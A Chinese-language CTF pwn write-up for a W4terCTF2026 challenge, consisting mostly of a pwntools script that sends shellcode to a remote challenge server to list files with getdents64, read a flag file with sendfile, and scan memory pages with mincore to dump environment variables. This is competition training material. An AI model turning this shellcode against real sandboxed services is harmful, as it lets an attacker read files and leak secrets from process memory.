---
title: W4terCTF2026 WP
published: 2026-05-01
description: 题目的质量很高，令人收获很大
tags: [OGW, shellcode, 扫描环境变量]
category: Pwn
draft: false
---

## 能力开发・鸟瞰把握

一道OGW+扫描栈上环境变量的shellcode题

[附件](https://github.com/sea1dream/pwn_contest_attachments/raw/refs/heads/main/W4terCTF2026/predator.zip)

开了沙箱，禁了execve和execveat，可以执行输入的shellcode
文件名不是flag，需要OGW列出当前目录下的文件来查找再用orw读取
还没完，只给了前半个flag，后半个在环境变量里
于是用mincore从高地址往低地址扫描内存页，找到已映射的页面后，把该页的地址和整页内容写到 stdout。

![拿到flag截图](https://uploader.shimo.im/f/o2CKeOhE2K5iG24Q.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE3Nzc2MjEzOTEsImZpbGVHVUlEIjoibTVrdmR6bUxHeVNhRHYzWCIsImlhdCI6MTc3NzYyMTA5MSwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwicGFhIjoiYWxsOmFsbDoiLCJ1c2VySWQiOjk5NTUxOTY5fQ.xziTbTppGIjCMZ81HXm2J4nWPpPniThKY3WQ3ZHQGkk)


```python
#!/usr/bin/env python3

from pwn import *
import os
import sys

# 获取当前脚本所在目录的绝对路径
base_dir = os.path.dirname(os.path.abspath(__file__))
# 将工作目录切换到脚本所在目录
os.chdir(base_dir)
print("当前工作目录:", os.getcwd())

exe = ELF("./pwn")

context.binary = exe
context(arch="amd64", os="linux")
context.log_level = "debug"
# context.terminal = ['tmux', 'splitw', '-h']
elf = context.binary


def str_to_hex(Str):
    return "0x" + bytearray(reversed(Str.encode())).hex()


def run_shellcode(shellcode, timeout=5):
    io = remote("100.107.118.64", 9335)
    io.recvuntil(b"Length: ")
    io.sendline(str(len(shellcode)).encode())
    io.recvuntil(b"Payload: ")
    io.send(shellcode)
    data = io.recvall(timeout=timeout)
    io.close()
    return data


def stack_stub(size):
    # mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)
    return asm(f"""
        xor edi, edi
        mov esi, {size:#x}
        mov edx, 3
        mov r10d, 0x22
        mov r8, -1
        xor r9d, r9d
        mov eax, 9
        syscall
        lea rsp, [rax+{size - 8:#x}]
        """)


# list files
sc1 = stack_stub(0x5000) + asm(f"""
    /* open(".", O_RDONLY) */
    push {str_to_hex('.')}
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 2
    syscall

    /* getdents64(fd, rsp, 0x1000) */
    mov rdi, rax
    sub rsp, 0x1000
    mov rsi, rsp
    mov rdx, 0x1000
    mov rax, 217
    syscall

    /* write(1, rsp, ...) */
    mov rdx, rax
    mov rsi, rsp
    mov rdi, 1
    mov rax, 1
    syscall
""")
data = run_shellcode(sc1)

# struct linux_dirent64 {
#     ino64_t        d_ino;    // 8 字节: inode 号
#     off64_t        d_off;    // 8 字节: 到下一个 dirent 的偏移
#     unsigned short d_reclen; // 2 字节: 当前这个结构体的总长度 (关键!)
#     unsigned char  d_type;   // 1 字节: 文件类型
#     char           d_name[]; // 变长:   文件名 (以 \x00 结尾)
# };

import struct


# 解析结构体
def parse_dirent64(data):
    files = []
    offset = 0

    while offset < len(data):
        # 确保剩余数据足够解析头部 (至少 19 字节)
        if offset + 19 > len(data):
            break

        # 解析 d_reclen (在偏移 16 的位置，2 字节，小端无符号短整型)
        d_reclen = struct.unpack_from("<H", data, offset + 16)[0]

        if d_reclen == 0:
            break  # 防止死循环

        # d_name 从偏移 19 开始，到 \x00 结束
        name_bytes = data[offset + 19 : offset + d_reclen]
        # 截取掉 \x00 之后的部分并解码
        name = name_bytes.split(b"\x00")[0].decode("utf-8", errors="ignore")

        if name not in (".", ".."):  # 过滤掉当前目录和上级目录
            files.append(name)

        # 跳到下一个结构体
        offset += d_reclen

    return files


print("找到的文件:", parse_dirent64(data))


# 无push+pop版本
sc2 = """
    /* call open('path', 'O_RDONLY', 'rdx') */
    mov rax, 2
    lea rdi, [rip + path]
    xor rsi, rsi /* O_RDONLY */
    syscall

    /* call sendfile(1, fd, 0, 0x7fffffff) */
    mov r10d, 0x7fffffff
    mov rsi, rax
    xor rax, rax
    mov al, 40
    mov edi, 1
    cdq /* rdx=0 */
    syscall

path:
    .string "./flag1_39v3b2z9"
"""
sc2 = asm(sc2)
data = run_shellcode(sc2)
flag1 = data.split(b"\n")[0].decode()
print("flag1 -> ", flag1)


# 扫描环境变量
PAGE = 0x1000
HEADER_MAGIC = 0xDEADBEEFCAFEBABE


import struct


# scan
def scan_stack():

    # 直接扫到 0x7FF800000000
    lower_bound = 0x7FF800000000

    sc_full = stack_stub(0x7000) + asm(f"""
        sub rsp, 0x40
        mov r13, 0x7ffffffff000
        mov r14, {lower_bound:#x}
                                   
    scan:
        /* mincore(addr, length, vec) */
        mov rdi, r13
        mov rsi, {PAGE:#x}
        lea rdx, [rsp]
        mov eax, 27
        syscall
        test eax, eax
        js next

        mov rax, {HEADER_MAGIC:#x}
        mov [rsp], rax
        mov [rsp+8], r13
        mov edi, 1
        mov rsi, rsp
        mov edx, 16
        mov eax, 1
        syscall

        mov edi, 1
        mov rsi, r13
        mov edx, {PAGE:#x}
        mov eax, 1
        syscall                           

    next:
        sub r13, {PAGE:#x}
        cmp r13, r14
        jae scan
                                   
        mov edi, 0
        mov eax, 60
        syscall
    """)

    data = run_shellcode(sc_full, timeout=60)

    if not data:
        print("未接收到数据")
        return set()

    offset = 0
    environs = set()
    while offset < len(data):
        # 寻找 Magic 头部
        idx = data.find(struct.pack("<Q", HEADER_MAGIC), offset)
        if idx == -1 or idx + 16 + PAGE > len(data):
            break

        # 提取这一页的数据
        page_data = data[idx + 16 : idx + 16 + PAGE]

        # 按 \x00 分割字符串
        for chunk in page_data.split(b"\x00"):
            if b"=" in chunk:
                # 确保是可见字符
                if all(0x20 <= c <= 0x7E for c in chunk):
                    env = chunk.decode()
                    environs.add(env)

        offset = idx + 8
    return environs


# 启动扫描
environs = scan_stack()
for env in environs:
    print(env)
print(flag1)
```

